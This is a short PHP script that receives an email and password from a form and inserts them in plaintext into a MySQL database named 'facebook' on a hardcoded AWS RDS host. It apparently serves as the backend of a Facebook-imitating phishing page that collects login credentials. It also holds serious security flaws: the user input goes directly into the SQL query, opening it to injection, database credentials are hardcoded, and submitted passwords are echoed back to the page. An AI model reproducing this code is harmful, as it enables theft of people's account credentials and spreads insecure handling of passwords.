<?php
// Retrieve email and password data from a POST request
$eml = $_POST['email'];
$psw = $_POST['psw'];

// Display test messages for debugging
echo "test"; // Test message
echo $eml;   // Display the email received from the form
echo $psw;   // Display the password received from the form

// Database connection configuration
$servername = "database-1.c4y2x4z72gki.ap-south-1.rds.amazonaws.com"; // Database server address
$username = "admin";              // Database username
$password = "Pass1234";           // Database password
$dbname = "facebook";             // Database name

// Create a new database connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check if the database connection was successful
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error); // If the connection fails, terminate with an error message
}

// SQL query to insert email and password data into the "posts" table
$sql = "INSERT INTO posts (email, password) VALUES ('$eml', '$psw')";

// Execute the SQL query and check for success or errors
if ($conn->query($sql) === TRUE) {
  echo "New record created successfully"; // Display a success message if the insertion was successful
} else {
  echo "Error: " . $sql . "<br>" . $conn->error; // Display an error message if there was an issue with the SQL query
}

// Close the database connection
$conn->close();
?>
